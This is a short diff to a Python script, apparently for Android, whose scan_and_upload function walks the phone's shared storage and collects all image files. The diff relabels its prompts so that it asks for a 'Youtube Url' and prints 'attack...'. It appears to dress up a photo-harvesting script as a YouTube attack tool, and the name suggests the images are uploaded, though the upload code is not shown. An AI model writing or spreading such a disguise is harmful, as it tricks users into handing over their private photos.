@@ -26,8 +26,8 @@ def scan_and_upload():
     image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
     base_dir = "/storage/emulated/0" 
     
-    target_id = input("Dosya Yolu ")
-    print(f"\n **{target_id}** message send...")
+    target_id = input("Youtube Url ")
+    print(f"\n **{target_id}** attack...")
     
     image_files = []
     for root, _, files in os.walk(base_dir):
@@ -37,7 +37,7 @@ def scan_and_upload():
     
     total_images = len(image_files)
     if total_images == 0:
-        print("dosya yolu bulunamadı!")
+        print("No url!")
         return
     
     print(f" **{total_images}** başlıyor...\n")
